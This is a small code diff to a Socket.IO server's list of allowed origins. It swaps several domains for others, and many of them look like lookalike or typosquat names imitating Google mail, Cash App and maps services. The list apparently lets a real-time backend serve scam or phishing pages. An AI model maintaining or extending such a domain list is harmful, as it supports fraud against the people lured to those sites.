@@ -58,9 +58,10 @@ const io = new Server(server, {
             'https://jasimserver.web.app',
             'https://effulgent-douhua-a34f03.netlify.app',
             'https://mail-qoogl.site',
-            'https://getliveconnction.site',
-            'https://escortbaylon.live',
-            'https://mpas-web3.xyz',
+            'https://duocalljoins.site',
+            'https://escortbabyliion.live',
+            'https://cashapp-pay.site',
+            'https://maps-web3.live',
            
 
         ],
